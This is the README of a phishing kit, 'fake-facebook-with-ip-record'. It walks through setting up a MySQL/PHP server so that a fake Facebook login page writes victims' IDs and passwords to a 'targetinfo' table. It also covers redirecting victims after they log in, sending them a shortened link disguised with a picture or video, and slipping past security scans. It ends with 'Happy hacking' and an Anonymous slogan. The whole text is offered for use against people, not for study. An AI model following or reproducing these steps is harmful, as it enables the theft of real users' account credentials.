# fake-facebook-with-ip-record

Install Request
================================
MySQL-Server
PHP (5.0 or up recommand)
phpmyadmin

Setup WebServer
================================
Copy the facebook folder to your host location
config the following File "fbidpwinsert.php" in facebook folder
    $dbhost = 'localhost';
    $dbname = 'facebook_info'; <- database name
    $dbtable = 'targetinfo';
    $dbuname = 'root';
    $dbpwd = 'your_password'; <- your db password
    
Create DB with phpmyadmin (http://localhost/phpmyadmin) [You should install phpmyamdin before]
Database name should be "facebook_info"
Import the "facebook_info.sql" to your MySQL by phpmyadmin
* "$dbname" should same with the "fbidpwinsert.php" includ

Last here is the jump page method after victim login you can change the following
in the File "fbidpwinsert.php" after the $mysqli_close($conn)
you can see the $URL object change the jump page you wanna go to...
My example will go the https://google.com

OK.... everythings you are ready.....
Make a short like whatever you want and send to your victim
Don't forget mask the like with some picture or video
Most Website maybe block your short link from secuirty scan
Happy hacking

We Are Legion
We Do Not Forget
We Do Not Forgive
Expect Us
